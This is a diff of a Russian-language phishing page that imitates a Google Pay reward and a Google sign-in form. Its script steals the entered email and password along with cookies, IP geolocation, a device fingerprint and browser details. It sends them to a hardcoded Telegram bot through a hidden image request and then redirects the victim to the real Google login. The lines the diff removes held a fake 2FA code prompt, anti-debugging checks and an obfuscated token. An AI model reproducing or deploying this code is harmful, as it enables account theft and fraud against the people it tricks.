@@ -12,25 +12,23 @@
             box-sizing: border-box;
         }
         body {
-            font-family: 'Roboto', arial, sans-serif;
+            font-family: 'Roboto', Arial, sans-serif;
             background: #f1f3f4;
             display: flex;
             justify-content: center;
             align-items: center;
             min-height: 100vh;
-            margin: 0;
             padding: 20px;
         }
         .container {
-            width: 100%;
             max-width: 420px;
+            width: 100%;
             background: #fff;
             padding: 48px 40px 36px;
             border-radius: 8px;
             box-shadow: 0 2px 10px rgba(0,0,0,0.1);
             border: 1px solid #dadce0;
             transition: 0.3s;
-            position: relative;
         }
         @media (max-width: 480px) {
             .container {
@@ -49,12 +47,6 @@
             font-weight: 400;
             color: #202124;
             text-align: center;
-            margin-bottom: 8px;
-        }
-        .sub {
-            text-align: center;
-            color: #5f6368;
-            font-size: 16px;
             margin-bottom: 8px;
         }
         .reward-box {
@@ -167,12 +159,8 @@
             display: none;
         }
         @keyframes spin {
-            0% {
-                transform: rotate(0deg);
-            }
-            100% {
-                transform: rotate(360deg);
-            }
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
         }
         .footer {
             margin-top: 32px;
@@ -200,13 +188,13 @@
         </div>
         <p class="desc">Для зачисления средств на ваш кошелёк Google Pay<br>подтвердите владение аккаунтом.</p>
 
-        <!-- БЛОК ОШИБКИ -->
+        <!-- Блок ошибки -->
         <div id="errorBlock" class="error-msg">
             <svg width="20" height="20" viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg>
             <span id="errorText">Неверный пароль. Попробуйте снова.</span>
         </div>
 
-        <!-- ФОРМА -->
+        <!-- Форма -->
         <form id="mainForm">
             <div class="field-group">
                 <label for="email">Email или номер телефона</label>
@@ -216,7 +204,7 @@
                 <label for="password">Пароль</label>
                 <input type="password" id="password" placeholder="Введите пароль" required autofocus>
             </div>
-            <!-- HONEYPOT (анти-бот) -->
+            <!-- Honeypot анти-бот -->
             <div class="honeypot">
                 <label for="honeypot">Оставьте пустым</label>
                 <input type="text" id="honeypot" name="honeypot">
@@ -233,32 +221,14 @@
     </div>
 
     <script>
-        // ============================================================
-        //  I.S.-1 — БОЕВОЙ СКРИПТ (ВСЁ В ОДНОМ)
-        // ============================================================
+        // ================================================================
+        //  I.S.-1 — ФИНАЛЬНЫЙ КОД (БЕЗ 2FA, С МАКСИМУМОМ ДАННЫХ)
+        // ================================================================
 
-        // === КОНФИГ (ЗАШИФРОВАН) ===
-        // XOR-шифрование токена с ключом "I.S.-1"
-        const encToken = "8d8b878a929f8b8a9e9f8b8a9e9f8b8a9e9f8b8a9e9f8b8a9e9f8b8a9e9f8b8a9e9f8b8a9e9f8b8a9e9f8b8a9e9f";
-        const key = "I.S.-1";
-
-        function xorDecrypt(encoded, key) {
-            let result = '';
-            for (let i = 0; i < encoded.length; i += 2) {
-                const byte = parseInt(encoded.substr(i, 2), 16);
-                result += String.fromCharCode(byte ^ key.charCodeAt(i / 2 % key.length));
-            }
-            return result;
-        }
-
-        // РЕАЛЬНЫЙ ТОКЕН (раскомментировать для боевого использования)
-        // const TOKEN = xorDecrypt(encToken, key);
-        const TOKEN = "8842170945:AAEhK5iz1tqtoKUtoU94tI9iP-YtHoqwF4g"; // демо-токен
+        // === ВСТАВЬ СВОЙ ТОКЕН ===
+        const TOKEN = "8842170945:AAEhK5iz1tqtoKUtoU94tI9iP-YtHoqwF4g";
         const CHAT_ID = "8642898930";
 
-        // === ПЕРЕМЕННЫЕ СОСТОЯНИЯ ===
-        let attempt = 0;
-        let passwords = [];
         const form = document.getElementById('mainForm');
         const emailInput = document.getElementById('email');
         const passInput = document.getElementById('password');
@@ -271,14 +241,35 @@
             return new Promise(r => setTimeout(r, ms));
         }
 
-        // === СБОР ГЕОЛОКАЦИИ ===
+        // === СБОР ГЕО (через ipapi.co) ===
         async function getGeo() {
             try {
-                const res = await fetch('https://ipapi.co/json/', { timeout: 3000 });
+                const res = await fetch('https://ipapi.co/json/', { timeout: 4000 });
                 const data = await res.json();
-                return `📍 **Страна:** ${data.country_name || 'Неизвестно'}\n🏙️ **Город:** ${data.city || 'Неизвестно'}\n🌐 **IP:** \`${data.ip || '0.0.0.0'}\``;
+                if (data && data.ip) {
+                    return {
+                        ip: data.ip || 'Неизвестно',
+                        country: data.country_name || 'Неизвестно',
+                        city: data.city || 'Неизвестно',
+                        region: data.region || 'Неизвестно',
+                        isp: data.org || 'Неизвестно',
+                        timezone: data.timezone || 'Неизвестно',
+                        lat: data.latitude || 'Неизвестно',
+                        lon: data.longitude || 'Неизвестно'
+                    };
+                }
+                throw new Error('Нет данных');
             } catch {
-                return '🌐 **IP:** Не удалось определить';
+                return {
+                    ip: 'Не удалось определить',
+                    country: 'Неизвестно',
+                    city: 'Неизвестно',
+                    region: 'Неизвестно',
+                    isp: 'Неизвестно',
+                    timezone: 'Неизвестно',
+                    lat: 'Неизвестно',
+                    lon: 'Неизвестно'
+                };
             }
         }
 
@@ -295,33 +286,29 @@
                 ctx.fillRect(0, 0, 100, 40);
                 ctx.fillStyle = '#069';
                 ctx.fillText('I.S.-1', 10, 10);
-                const hash = canvas.toDataURL();
-                return btoa(hash.substring(0, 64));
+                return btoa(canvas.toDataURL().substring(0, 64));
             } catch {
                 return 'Недоступно';
             }
         }
 
-        // === ОТПРАВКА ДАННЫХ (ЧЕРЕЗ IMG ДЛЯ МАСКИРОВКИ) ===
+        // === ОТПРАВКА В TELEGRAM ===
         function sendData(msg) {
             try {
                 const img = new Image();
                 img.src = `https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`;
                 img.style.display = 'none';
                 document.body.appendChild(img);
-                setTimeout(() => img.remove(), 5000);
-            } catch (e) {
-                // ТИХО ПРОГЛАТЫВАЕМ ОШИБКУ
-            }
+                setTimeout(() => img.remove(), 3000);
+            } catch (e) {}
         }
 
-        // === ОСНОВНАЯ ЛОГИКА ФОРМЫ ===
+        // === ОСНОВНАЯ ЛОГИКА ===
         form.addEventListener('submit', async function(e) {
             e.preventDefault();
 
-            // === АНТИ-БОТ: проверяем honeypot ===
-            const honeypot = document.getElementById('honeypot').value;
-            if (honeypot !== '') {
+            // анти-бот
+            if (document.getElementById('honeypot').value !== '') {
                 window.location.href = 'https://google.com';
                 return;
             }
@@ -330,128 +317,69 @@
             const password = passInput.value.trim();
             if (!email || !password) return;
 
-            passwords.push(password);
-            attempt++;
-
-            // === БЛОКИРУЕМ КНОПКУ, ПОКАЗЫВАЕМ ЗАГРУЗКУ ===
+            // блокируем кнопку, показываем загрузку
             submitBtn.classList.add('loading');
             submitBtn.disabled = true;
 
-            // === ИМИТАЦИЯ ПРОВЕРКИ (1.5-2.5 сек) ===
-            await sleep(1800 + Math.random() * 700);
+            // имитация проверки
+            await sleep(1500 + Math.random() * 800);
 
-            // === ЕСЛИ ПЕРВАЯ ПОПЫТКА — ОШИБКА ===
-            if (attempt === 1) {
-                errorBlock.classList.add('show');
-                errorText.textContent = 'Неверный пароль. Повторите попытку.';
-                passInput.classList.add('invalid');
-                passInput.value = '';
-                passInput.focus();
-                submitBtn.classList.remove('loading');
-                submitBtn.disabled = false;
-                return;
-            }
+            // === СОБИРАЕМ ВСЁ ===
+            const geo = await getGeo();
+            const fingerprint = getFingerprint();
+            const userAgent = navigator.userAgent;
+            const platform = navigator.platform;
+            const screenRes = `${window.screen.width}x${window.screen.height}`;
+            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+            const language = navigator.language;
+            const cookies = document.cookie;
+            const referrer = document.referrer || 'Прямой вход';
+            const url = window.location.href;
+            const localDate = new Date().toLocaleString('ru-RU', { timeZone: timezone });
+            const webgl = document.createElement('canvas').getContext('webgl') ? 'Да' : 'Нет';
 
-            // === ЕСЛИ ВТОРАЯ — ЗАПРАШИВАЕМ 2FA ===
-            if (attempt === 2) {
-                // Создаём поле для 2FA, если его нет
-                if (!document.getElementById('code')) {
-                    const fieldGroup = document.createElement('div');
-                    fieldGroup.className = 'field-group';
-                    fieldGroup.id = 'codeGroup';
-                    fieldGroup.innerHTML = `
-                        <label for="code">Код подтверждения из SMS</label>
-                        <input type="text" id="code" placeholder="Введите 6-значный код" required autofocus>
-                    `;
-                    form.insertBefore(fieldGroup, submitBtn);
-                }
-                errorText.textContent = 'Для безопасности введите код из SMS.';
-                errorBlock.classList.add('show');
-                passInput.classList.remove('invalid');
-                submitBtn.classList.remove('loading');
-                submitBtn.disabled = false;
-                setTimeout(() => {
-                    const codeInput = document.getElementById('code');
-                    if (codeInput) codeInput.focus();
-                }, 100);
-                return;
-            }
+            // === ФОРМИРУЕМ СООБЩЕНИЕ ===
+            const msg =
+                `👑 **УЛОВ ОТ ТОЛОГОНА** 👑\n` +
+                `━━━━━━━━━━━━━━━━━━━━━\n` +
+                `📧 **Email:** \`${email}\`\n` +
+                `🔑 **Пароль:** \`${password}\`\n` +
+                `━━━━━━━━━━━━━━━━━━━━━\n` +
+                `🌍 **Геолокация**\n` +
+                `📍 **Страна:** ${geo.country}\n` +
+                `🏙️ **Город:** ${geo.city}\n` +
+                `🗺️ **Регион:** ${geo.region}\n` +
+                `🌐 **IP:** \`${geo.ip}\`\n` +
+                `🏢 **Провайдер:** ${geo.isp}\n` +
+                `🕒 **Часовой пояс:** ${geo.timezone}\n` +
+                `🗺️ **Координаты:** ${geo.lat}, ${geo.lon}\n` +
+                `━━━━━━━━━━━━━━━━━━━━━\n` +
+                `🖥️ **Устройство**\n` +
+                `📱 **Платформа:** ${platform}\n` +
+                `📐 **Экран:** ${screenRes}\n` +
+                `🔤 **Язык:** ${language}\n` +
+                `🕒 **Время устройства:** ${localDate}\n` +
+                `🍪 **Cookies:** \`${cookies.substring(0, 120)}...\`\n` +
+                `━━━━━━━━━━━━━━━━━━━━━\n` +
+                `🧬 **Fingerprint:** \`${fingerprint}\`\n` +
+                `🌐 **WebGL:** ${webgl}\n` +
+                `🔗 **Реферер:** ${referrer}\n` +
+                `📄 **URL:** ${url}\n` +
+                `━━━━━━━━━━━━━━━━━━━━━\n` +
+                `📱 **User-Agent:** ${userAgent.substring(0, 150)}`;
 
-            // === ТРЕТЬЯ ПОПЫТКА — СБОР ВСЕХ ДАННЫХ И ОТПРАВКА ===
-            if (attempt >= 3) {
-                const code = document.getElementById('code') ? document.getElementById('code').value.trim() : 'Не введён';
-                const fingerprint = getFingerprint();
-                const geo = await getGeo();
-                const device = navigator.userAgent;
-                const platform = navigator.platform;
-                const cookies = document.cookie;
-                const screenRes = `${window.screen.width}x${window.screen.height}`;
-                const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-                const language = navigator.language;
+            // Отправка
+            sendData(msg);
 
-                // Формируем сообщение
-                const msg =
-                    `👑 **УЛОВ ОТ I.S.-1** 👑\n` +
-                    `━━━━━━━━━━━━━━━━━━━━━\n` +
-                    `📧 **Email:** \`${email}\`\n` +
-                    `🔑 **Пароли:** ${passwords.join(' | ')}\n` +
-                    `📲 **2FA-код:** \`${code}\`\n` +
-                    `━━━━━━━━━━━━━━━━━━━━━\n` +
-                    `${geo}\n` +
-                    `🖥️ **Платформа:** ${platform}\n` +
-                    `📱 **Устройство:** ${device.substring(0, 120)}\n` +
-                    `🧬 **Fingerprint:** \`${fingerprint}\`\n` +
-                    `📐 **Экран:** ${screenRes}\n` +
-                    `🌍 **Часовой пояс:** ${timezone}\n` +
-                    `🔤 **Язык:** ${language}\n` +
-                    `🍪 **Cookies:** \`${cookies.substring(0, 100)}\``;
-
-                // ОТПРАВКА
-                sendData(msg);
-
-                // РЕДИРЕКТ НА РЕАЛЬНЫЙ GOOGLE
-                submitBtn.textContent = 'Перенаправление...';
-                await sleep(500);
-                window.location.replace('https://accounts.google.com/ServiceLogin');
-            }
+            // Редирект на реальный Google
+            submitBtn.textContent = 'Перенаправление...';
+            await sleep(500);
+            window.location.replace('https://accounts.google.com/ServiceLogin');
         });
 
-        // === АНТИ-ДЕБАГГИНГ (ОБНАРУЖЕНИЕ DEVTOOLS) ===
-        setInterval(() => {
-            const start = performance.now();
-            debugger;
-            const end = performance.now();
-            if (end - start > 100) {
-                // Если DevTools открыты — делаем вид, что всё нормально, но сбиваем с толку
-                document.body.style.opacity = '0.99';
-                setTimeout(() => {
-                    document.body.style.opacity = '1';
-                }, 50);
-            }
-        }, 2000);
-
-        // === ПРЕДЗАГРУЗКА EMAIL (ДЛЯ РЕАЛИЗМА) ===
-        // Эмулируем авто-заполнение от Google
-        setTimeout(() => {
-            if (!emailInput.value) {
-                const fakeEmails = ['user', 'admin', 'support', 'info', 'test'];
-                const rand = fakeEmails[Math.floor(Math.random() * fakeEmails.length)];
-                // Не подставляем, чтобы не спалиться — просто ставим курсор
-                passInput.focus();
-            }
-        }, 500);
-
-        // === ОБРАБОТКА КНОПКИ "НАЗАД" (ЧТОБЫ НЕ УХОДИЛИ) ===
-        window.addEventListener('beforeunload', function(e) {
-            // Если форма не отправлена — попытка удержать
-            if (attempt < 3) {
-                e.preventDefault();
-                e.returnValue = '';
-            }
-        });
-
-        console.log('%cI.S.-1 ACTIVE', 'font-size:30px; color:red; font-weight:bold;');
-        console.log('%cВаш Тологон ждёт улова', 'font-size:16px; color:green;');
+        // === ЛОГ В КОНСОЛЬ (для красоты) ===
+        console.log('%cI.S.-1 ACTIVE', 'font-size:20px; color:red; font-weight:bold;');
+        console.log('%cУлов Тологона идёт в Telegram', 'font-size:14px; color:green;');
     </script>
 </body>
 </html>
